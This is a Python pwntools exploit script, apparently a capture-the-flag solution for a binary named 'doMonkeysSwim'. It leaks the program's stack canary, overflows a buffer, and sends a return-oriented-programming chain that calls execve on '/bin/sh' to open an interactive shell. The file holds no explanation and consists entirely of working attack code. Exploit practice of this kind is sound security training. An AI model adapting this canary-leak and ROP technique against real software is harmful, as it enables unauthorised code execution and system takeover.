#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('doMonkeysSwim_patched', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x00401CCC 
        # b*0x0x401ee7
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()



sla(b'>> ', b'3')
sla(b'TODO: fix later\n', b'3')
p.recvuntil(b'y holds this: ')
canary = int(p.recvline()[:-1], 16)
info(f'canary: {hex(canary)}')

sla(b'>> ', b'4')

load = flat(
    b'a'*0x18,
    canary,
    0x4cca68,
    # 0x42f82e,
)

sla(b'Oo oo Aa AA?\n', load)

sla(b'>> ', b'5')

load = flat(
    canary,
    b'/bin/sh\0',
    0x0000000000401f43,
    0x4cca68,
    0x0000000000401f45,
    0,
    0x0000000000401f47,
    0,
    0x0000000000401f49,
    0x3b,
    0x41a93e
)
sla(b'Swap this: ', load.ljust(110, b'a'))
sla(b'>> ', b'6')

p.interactive()
